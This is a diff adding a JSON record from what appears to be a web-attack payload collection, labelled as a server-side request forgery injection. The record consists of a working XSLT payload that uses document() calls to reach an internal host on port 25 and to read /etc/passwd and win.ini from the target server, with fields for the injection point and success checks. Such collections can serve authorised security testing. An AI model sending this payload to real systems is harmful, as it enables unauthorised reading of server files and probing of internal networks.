@@ -1,0 +1,13 @@
+[
+  {
+    "payload_id": "OWP-51226",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\r\n  <xsl:template match=\"/fruits\">\r\n    <xsl:copy-of select=\"document('http://172.16.132.1:25')\"/>\r\n    <xsl:copy-of select=\"document('/etc/passwd')\"/>\r\n    <xsl:copy-of select=\"document('file:///c:/winnt/win.ini')\"/>\r\n    Fruits:\r\n\t    <!-- Loop for each fruit -->\r\n    <xsl:for-each select=\"fruit\">\r\n      <!-- Print name: description -->\r\n      - <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/>\r\n    </xsl:for-each>\r\n  </xsl:template>\r\n</xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
